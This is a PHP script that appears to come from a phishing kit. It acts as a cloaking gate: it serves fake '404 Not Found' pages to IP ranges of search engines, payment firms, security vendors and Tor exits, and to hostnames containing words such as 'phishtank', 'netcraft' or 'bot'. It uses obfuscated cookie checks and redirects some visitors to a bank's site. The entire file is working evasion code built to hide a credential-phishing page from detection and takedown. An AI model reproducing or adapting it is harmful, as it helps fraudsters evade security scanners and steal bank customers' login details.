<?php
$IP_Connected = $_SERVER['REMOTE_ADDR'];
 $IP_Banned = array('185.28.20.243', '^64.106.213.*', '^89.138.*.*', '^66.207.120.*', '^50.7.*.*', '^158.108.*.*', '^67.15.*.*', '^93.172.*.*', '^74.125.*.*', '^212.235.*.*', '^185.28.20.*', '^69.61.12.*', '^198.54.*.*', '^216.239.32.*', '^72.14.192.*', '^212.150.*.*', '^66.249.*.*', '^198.25.*.*', '^209.85.*.*', '^192.115.134.*', '^194.90.*.*', '^212.143.*.*', '^62.90.*.*', '^167.24.*.*', '^64.18.*.*', '^202.108.252.*', '^217.16.26.*', '68.65.53.71', '^206.28.72.*', '^194.72.238.*', '^212.29.224.*', '^69.65.*.*', '^193.47.80.*', '^204.14.48.*', '^85.64.*.*', '^66.102.*.*', '^66.221.*.*', '^82.166.*.*', '^193.253.199.*', '^38.105.*.*', '^64.27.2.*', '^212.50.193.*', '^209.73.228.*', '^217.132.*.*', '^66.205.64.*', '^64.37.103.*', '^54.176.*.*', '^193.220.178.*', '^62.116.207.*', '217.16.26.166', '^212.29.192.*', '^168.188.*.*', '^85.250.*.*', '^50.97.*.*', '^38.144.36.*', '^173.194.*.*', '^131.212.*.*', '^184.173.*.*', '^192.118.48.*', '^12.148.196.*', '^207.126.144.*', '^194.52.68.*', '^64.124.14.*', '^38.100.*.*', '^208.65.144.*', '^67.209.128.*', '^109.186.*.*', '^64.233.160.*', '^54.228.218.*', '54.228.218.117', '^64.62.136.*', '^12.148.209.*', '^46.116.*.* ', '^149.20.*.*', '^107.170.*.*', '^64.62.175.*', '^209.85.128.*', '^66.150.14.*', '^216.252.167.*', '^128.242.*.*','^66.211.168.*','^66.211.169.*','^66.211.170.*','^66.211.171.*');
if(in_array($IP_Connected,$IP_Banned)){
	header("HTTP/1.0 404 Not Found");
    $errors = '<h1>404 Not Found</h1>The page that you have requested could not be found.<br>';
    die($errors);
} else {
		foreach($IP_Banned as $ip) {
			if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
				header('HTTP/1.0 404 Not Found');
				die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
			}
		}
	};
				
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array('cmu', 'netpilot', 'millersmiles', 'bot', 'crawler', 'siteadvisor', 'scanurl', 'crawl', 'ebay', 'phishtank', 'phishfighting', 'crime', 'websecurityguard', 'opendns', 'onlinelinkscan', 'sucuri.net', 'amazonaws', 'p3pwgdsn', 'paypal', 'messagelabs', 'stanford', 'internetdefence', '000webhost', 'mywot', 'netcraft', 'antiphishing', 'drweb', 'Dr.Web', 'phish', 'phishery', 'dreamhost', 'above', 'softlayer', 'torservers', 'calyxinstitute', 'cyveillance', 'trendmicro', 'sonicwall', 'gstatic', 'goo', 'hostinger', 'google', 'facebook', 'wikipedia', 'onguardonline', 'tor-exit', 'msnbot');
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    };
};

if(isset($_COOKIE['5075140835d0bc504791c76b04c33d2bck'])){
	$t = time();$bt = $_COOKIE['ce114cdc5e387191210f3b519dfb118bck'];$d=dirname($_SERVER['PHP_SELF']);
	$curr = $_SERVER['PHP_SELF'] != $d.'/index.php' &&  $_SERVER['PHP_SELF'] != $d.'/login.php';
	$td = $t - $_COOKIE['ce114cdc5e387191210f3b519dfb118bck'];
	if($td < 5 && $curr){
	    header("HTTP/1.0 404 Not Found");
     die("<h1>404 Not Found</h1>The page that you have requested could not be found.");};
	if($_COOKIE['5075140835d0bc504791c76b04c33d2bck']=='7f021a1415b86f2d013b2618fb31ae53y3r'){
	header('location:https://huntington.com');}}
else{header("HTTP/1.0 404 Not Found");
     die("<h1>404 Not Found</h1>The page that you have requested could not be found.");};
?>
